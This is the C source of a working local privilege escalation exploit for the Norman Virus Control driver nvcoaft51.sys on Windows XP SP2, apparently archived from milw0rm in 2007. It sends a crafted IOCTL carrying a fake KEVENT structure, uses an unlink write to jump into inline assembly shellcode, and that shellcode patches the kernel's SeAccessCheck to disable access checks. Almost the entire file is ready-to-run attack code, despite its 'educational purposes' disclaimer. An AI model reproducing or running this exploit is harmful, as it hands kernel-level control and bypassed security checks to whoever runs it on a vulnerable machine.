/*
  Norman Virus Control nvcoaft51.sys ioctl BF672028 exploit


  Abstract
  nvcoaft51.sys driver receive as parameter in some ioctl's
  a pointer to a KEVENT struct, calling KeSetEvent without
  any prior check. 
  The device created by the driver (NvcOa) can be opened by 
  any user.
  As result, a user can send a IOCTL with a fake KEVENT 
  struct and finish executing code at ring0

  Author
  inocraM - inocram[at]48bits[dot]com
  48bits I+D team
  www.48bits.com

  OS
  Tested against Windows XP SP2 (spanish) with a PAE kernel.
  
  For educational purposes ONLY

*/

#define _CRT_SECURE_NO_DEPRECATE
#include <windows.h>
#include <stdio.h>

#define XPLT_KEVENT_IOCTL             0xbf672028 


/* PSAPI */
typedef BOOL  (WINAPI * ENUM_DEVICE_DRIVERS)(LPVOID* lpImageBase,DWORD cb,LPDWORD lpcbNeeded);
typedef DWORD (WINAPI * GET_DEVICE_DRIVER_BASE_NAME)(LPVOID ImageBase,LPSTR lpBaseName,DWORD nSize);

typedef struct _PS
{
  HMODULE hLib;
  ENUM_DEVICE_DRIVERS pEnumDeviceDrivers;
  GET_DEVICE_DRIVER_BASE_NAME pGetDeviceDriverBaseName;
}PS, *PPS;


VOID
psUnload(PPS pps)
{
  if(pps)
  {
    if(pps->hLib)
    {
      FreeLibrary(pps->hLib);
    }
    free(pps);
  }
}

PPS
psLoad()
{
  PPS pps;

  pps = (PPS) malloc(sizeof(PS));
  if(pps)
  {
    pps->hLib = LoadLibraryA("psapi");
    if(pps->hLib)
    {
      pps->pEnumDeviceDrivers = (ENUM_DEVICE_DRIVERS)GetProcAddress(pps->hLib, "EnumDeviceDrivers");
      pps->pGetDeviceDriverBaseName = (GET_DEVICE_DRIVER_BASE_NAME)GetProcAddress(pps->hLib,"GetDeviceDriverBaseNameA");
      if(!pps->pEnumDeviceDrivers || !pps->pGetDeviceDriverBaseName)
      {
        psUnload(pps);
        pps = NULL;
      }
    }
    else
    {
      free(pps);
      pps = NULL;
    }
  }
  return pps;
}


BOOL  
psEnumDeviceDrivers(PPS pps, LPVOID* lpImageBase,DWORD cb,LPDWORD lpcbNeeded)
{
  return pps->pEnumDeviceDrivers(lpImageBase, cb, lpcbNeeded);
}

DWORD 
psGetDeviceDriverBaseName(PPS pps, LPVOID ImageBase,LPSTR lpBaseName,DWORD nSize)
{
  return pps->pGetDeviceDriverBaseName(ImageBase, lpBaseName, nSize);
}

LPVOID
psGetImageBaseByBaseName(PPS pps, LPCSTR szName)
{
  DWORD dwSize = 0;
  LPVOID *pDevices = NULL;
  LPVOID pResult = NULL;

  if(psEnumDeviceDrivers(pps, NULL, 0, &dwSize) && (dwSize > 0))
  {
    pDevices = (LPVOID*)malloc(dwSize);
    if(pDevices)
    {
      if(psEnumDeviceDrivers(pps, pDevices, dwSize, &dwSize))
      {
        DWORD i = 0;
        DWORD dwNumberOfDrivers;

        dwNumberOfDrivers = dwSize / sizeof(LPVOID);
        while((i < dwNumberOfDrivers) && (NULL == pResult))
        {
          char szBaseName[MAX_PATH];

          if(psGetDeviceDriverBaseName(pps, pDevices[i], szBaseName, sizeof(szBaseName)))
          {
            if(!_stricmp(szBaseName,szName))
            {
              pResult = pDevices[i];
            }
          }
          i++;
        }
      }
      free(pDevices);
    }
  }
  return pResult;
}

/* OS detection */
#define OS_VERSION_UNKNOWN      0x00000000
#define OS_VERSION_NT           0x00010000
#define OS_VERSION_9X           0x00020000
#define OS_VERSION_WIN32S       0x00030000
#define OS_VERSION_NT4          OS_VERSION_NT + 0x00001000
#define OS_VERSION_2K           OS_VERSION_NT + 0x00002000
#define OS_VERSION_XP           OS_VERSION_NT + 0x00003000
#define OS_VERSION_2K3          OS_VERSION_NT + 0x00004000
#define OS_VERSION_VISTA        OS_VERSION_NT + 0x00005000
#define OS_VERSION_95           OS_VERSION_9X + 0x00001000
#define OS_VERSION_98           OS_VERSION_9X + 0x00002000
#define OS_VERSION_ME           OS_VERSION_9X + 0x00003000


DWORD
GetWindows9xVersion(POSVERSIONINFOEXA posvi)
{
  DWORD dwVersion;

  if(posvi->dwMajorVersion == 4)
  {
    switch(posvi->dwMinorVersion)
    {
    case 0:
      dwVersion = OS_VERSION_95;
      break;
    case 10:
      // TODO : we need extra code. this can be Windows ME
      dwVersion = OS_VERSION_98;
      break;
    case 90:
      dwVersion = OS_VERSION_ME;
      break;
    default:
      dwVersion = OS_VERSION_UNKNOWN;
    }
  }
  else
  {
    dwVersion = OS_VERSION_UNKNOWN;
  }
  return dwVersion;
}


DWORD
GetWindowsNtVersion(POSVERSIONINFOEXA posvi, PUINT pServicePack)
{
  DWORD dwVersion;

  switch(posvi->dwMajorVersion)
  {
  case 6: 
    dwVersion = OS_VERSION_VISTA;
    break;
  case 5:
    switch(posvi->dwMinorVersion)
    {
    case 2:
      dwVersion = OS_VERSION_2K3;
      break;
    case 1:
      dwVersion = OS_VERSION_XP;
      break;
    case 0:
      dwVersion = OS_VERSION_2K;
      break;
    default:
      dwVersion = OS_VERSION_UNKNOWN;
    }
    break;
  case 4:
  case 3:
  case 2:
  case 1:
  case 0:
    dwVersion = OS_VERSION_NT4;
    break;
  default:
    dwVersion = OS_VERSION_UNKNOWN;
  }

  // TODO : dont work correctly in various windows Versions. fix it.
  if((OS_VERSION_UNKNOWN != dwVersion) && (NULL != pServicePack))
  {
    if(sizeof(OSVERSIONINFOEXA) == posvi->dwOSVersionInfoSize)
    {
      (*pServicePack) = posvi->wServicePackMajor;
    }
    else
    {
      // TODO : parse szCSDVersion
    }
  }
  return dwVersion;
}

// TODO : doesnt find correct SP for various windows versions, fix! 
DWORD
GetWindowsVersionBase(PUINT pServicePack)
{
  OSVERSIONINFOEXA osvi;
  DWORD dwVersion;

  if(pServicePack)
  {
    (*pServicePack) = 0;
  }
  memset(&osvi, 0, sizeof(OSVERSIONINFOEXA));
  osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
  if(FALSE == GetVersionExA((LPOSVERSIONINFOA)&osvi))
  {
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    if(!GetVersionExA((LPOSVERSIONINFOA)&osvi))
    {
      return OS_VERSION_UNKNOWN;
    }
  }
  switch(osvi.dwPlatformId)
  {
  case VER_PLATFORM_WIN32_NT:
    dwVersion = GetWindowsNtVersion(&osvi, pServicePack);
    break;
  case VER_PLATFORM_WIN32_WINDOWS:
    dwVersion = GetWindows9xVersion(&osvi);
    break;
  case VER_PLATFORM_WIN32s:
    dwVersion = OS_VERSION_WIN32S;
    break;
  default:
    dwVersion = OS_VERSION_UNKNOWN;
  }
  return dwVersion;
}

DWORD
GetWindowsVersion(PUINT pServicePack)
{
  static BOOL bFirstCall = TRUE;
  static DWORD OsVersion;
  static UINT ServicePack;

  if(bFirstCall)
  {
    OsVersion = GetWindowsVersionBase(&ServicePack);
    bFirstCall = FALSE;
  }
  if(pServicePack)
  {
    (*pServicePack) = ServicePack;
  }
  return OsVersion;
}



HANDLE
OpenDevice(LPCSTR szDevice, DWORD dwDesiredAccess, DWORD dwShareMode)
{
  return CreateFileA(szDevice,dwDesiredAccess,dwShareMode,NULL,OPEN_EXISTING,0,NULL);
}

VOID
CloseDevice(HANDLE hDevice)
{
  CloseHandle(hDevice);
}


BOOL
xpltCheckWindowsVersion()
{
  DWORD dwOsVersion;
  BOOL bResult = FALSE;
  UINT ServicePack;

  printf("(*)Checking OS Version...\n");
  dwOsVersion = GetWindowsVersion(&ServicePack);
  if((OS_VERSION_XP == dwOsVersion) && (ServicePack == 2))
  {
    printf("(+)Detected Windows XP SP2.\n");
    bResult = TRUE;
  }
  else
  {
    printf("(-)This exploit only runs on Windows XP SP2. Sorry.\n");
  }
  return bResult;
}

HANDLE
xpltOpenNvc0a()
{
  HANDLE hDevice;

  printf("(*)Opening NvcOa device...\n");
  hDevice = OpenDevice("\\\\.\\NvcOa", GENERIC_READ + GENERIC_WRITE, 0);
  if(INVALID_HANDLE_VALUE != hDevice)
  {
    printf("(+)Successfully opened NvcOa.\n");
  }
  else
  {
    printf("(-)Unable to open NvcOa. Sorry.\n");
  }
  return hDevice;
}

VOID
xpltCloseNvc0a(HANDLE hDevice)
{
  CloseDevice(hDevice);
  printf("(+)NvcOa device closed.\n");
}

PPS
xpltInitializePsApi()
{
  PPS pps;
  printf("(*)Loading PSAPI...\n");
  pps = psLoad();
  if(NULL != pps)
  {
    printf("(+)PSAPI loaded OK.\n");
  }
  else
  {
    printf("(-)Unable to load PSAPI. Sorry.\n");
  }
  return pps;
}

VOID
xpltFreePsApi(PPS pps)
{
  psUnload(pps);
  printf("(+)PSAPI Unloaded.\n");
}


LPBYTE
xpltGetKernelBase(PPS pps, PBOOL pbPaeKernel)
{
  LPBYTE pKernelBase;

  printf("(*)Looking for NTOSKRNL base...\n");
  (*pbPaeKernel) = FALSE;
  pKernelBase = (LPBYTE) psGetImageBaseByBaseName(pps, "NTOSKRNL.EXE");
  if(pKernelBase)
  {
    printf("(+)NTOSKRNL base found at %#x.\n",pKernelBase);
  }
  else
  {
    pKernelBase = (LPBYTE) psGetImageBaseByBaseName(pps, "NTKRNLPA.EXE");
    if(pKernelBase)
    {
      printf("(+)NTOSKRNL(PAE) base found at %#x.\n",pKernelBase);
      if(pbPaeKernel)
      {
        (*pbPaeKernel) = TRUE;
      }
    }
    else
    {
      printf("(-)Unable to find NTOSKRNL base. Sorry.\n");
    }
  }
  return pKernelBase;
}


/* 
   when the ioctl with a fake event structure is sent
   a dword with the opcode "jmp[ecx]" is written and
   this code is reached.
   Be careful writing your own shellcode. Remember that
   u are at DPC level
*/
__declspec(naked)
void 
xpltPatchAndGo (void)
{
  __asm
  {
    add esp,4
    pop esi                                   /* get a return addr to use as reference */ 
    mov dword ptr[esi-0x60], 0x8B047289       /* patch the jmp[ecx] with the correct code */
    mov word ptr[esi+0xE5303], 0x9090         /* patch SeAccessCheck :o) */
    mov esp, ebp                              /* reconstruct the stack */
    add esp, 0x10       
    xor bl, bl                                /* set IRQL value */
    xor edi, edi                              /* set return value */                       
    sub esi, 0x759F                            
    push esi                                  /* set retun address... */
    ret                                       /* and go */
  }

}

VOID
xpltExecuteExploit(HANDLE hDevice, PBYTE pNtosBase, BOOL bPaeKernel)
{

#ifdef _DEBUG
  DebugBreak();
#endif

  if(!bPaeKernel)
  {
    printf("(-)This exploit is only runs on a PAE kernel system. Sorry.\n");
  }
  else
  {
    DWORD dwReturnedBytes;
    DWORD Buffer[1024];                             /* user buffer size is not checked         */
                                                    /* properly so i use a big enough  buffer  */
                                                    /* and i  dont worry abaut it              */

    DWORD Event[31];                                /* our event struct                        */

    printf("(*)Trying to exploit the NvCoaft51 KeSetEvent vuln...\n");
    printf("(*)Writing fake event struct...\n");

    *(BYTE*)Event = 1;                              /* set event type as Synchronization Event */

    Event[2] = (DWORD)&(Event[3]);                  /* set event wait list as not empty so in  */
                                                    /* event[3] start the first  wait block    */

    Event[3] = (DWORD)&(Event[4]);                  /* set first element of the wait list      */
                                                    /* event[4]  will be our wait block        */

    ((WORD*)Event)[17] = 1;                         /* set the wait block type to WaitAny      */

    Event[5] = (DWORD)&(Event[7]);                  /* set the trhead for the wait block, so   */
                                                    /* event[7] will be our thread start       */

    Event[7] = (DWORD)xpltPatchAndGo;               /* i put the shellcode addr on the first   */
                                                    /* dword of the thread. This value is not  */
                                                    /* checked by KeSetEvent related code, and */
                                                    /* the event struct will remain referenced */
                                                    /* by ecx,so writing a jmp[ecx] the        */
                                                    /* shellocde will be reached               */


    Event[30] = (DWORD)&(Event[10]);                /* fill thread wait block list with data   */
                                                    /* so in event[10] start this wait block.  */
                                                    /* First two dwords of the kwait block     */
                                                    /* struct are a list entry. system will    */
                                                    /* try to remove a item from this double   */
                                                    /* linked list, and as consecuence, we     */
                                                    /* can write an arbitrary dword at any     */
                                                    /* address                                 */


    Event[10] = 0x000021FF;                         /* first entry will be a opcode, jmp[ecx]  */

    Event[11] = (DWORD)(pNtosBase + 0x291B4);       /* second entry will be the address of th  */
                                                    /* next opcode addr, and as result we will */
                                                    /* jmp to our shellcode                    */


    Buffer[0] = (DWORD)(((PBYTE)(&Event)) - 0x84C); /* store our "event" in the ioctl buffer   */
                                                    /* and explit it :o)                       */

    printf("(*)Sending IOCTL...\n");
    DeviceIoControl(hDevice,XPLT_KEVENT_IOCTL,Buffer,sizeof(Buffer),Buffer,sizeof(Buffer),&dwReturnedBytes,NULL);
    printf("(+)IOCT sent. SeAccessCheck is now patched???\n");
  }
}


VOID
xpltExecute()
{
  if(xpltCheckWindowsVersion())
  {
    PPS pps;

    pps = xpltInitializePsApi();
    if(NULL != pps)
    {
      LPBYTE pKernelBase;
      BOOL bPaeKernel;

      pKernelBase = xpltGetKernelBase(pps,&bPaeKernel);
      if(NULL != pKernelBase)
      {
        HANDLE hDevice;

        hDevice = xpltOpenNvc0a();
        if(INVALID_HANDLE_VALUE != hDevice)
        {
          xpltExecuteExploit(hDevice, pKernelBase, bPaeKernel);
          xpltCloseNvc0a(hDevice);
        }
      }
      xpltFreePsApi(pps);
    }
  }
}

int main(int argc, char * argv[])
{
  UNREFERENCED_PARAMETER(argc);
  UNREFERENCED_PARAMETER(argv);

#ifdef _DEBUG
  DebugBreak();
#endif

  xpltExecute();
  return 0;
}

// milw0rm.com [2007-08-30]
